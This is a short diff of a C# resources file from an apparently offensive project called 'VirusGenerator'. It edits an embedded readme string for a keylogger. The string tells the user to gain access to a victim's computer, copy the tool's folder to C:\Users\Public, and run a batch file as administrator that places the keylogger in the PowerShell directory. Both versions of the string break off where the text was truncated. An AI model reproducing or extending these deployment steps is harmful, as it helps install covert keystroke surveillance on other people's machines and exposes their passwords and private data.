@@ -117,8 +117,8 @@ namespace VirusGenerator.Properties {
         ///What you need to do is:
         ///
         ///1. Get access to the victim&apos;s computer.
-        ///2. Copy the folder to the Deskop.
-        ///3. Run the batch file AS AN ADMINISTRATOR which will copy the keylogger to the powershell directory on the  [rest of string was truncated]&quot;;.
+        ///2. Copy the folder to &quot;C:\Users\Public&quot; &lt;-- You can replace this with whatever you like, just make sure you change it in copy.bat as well.
+        ///3. [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string readmeKeylogger {
             get {
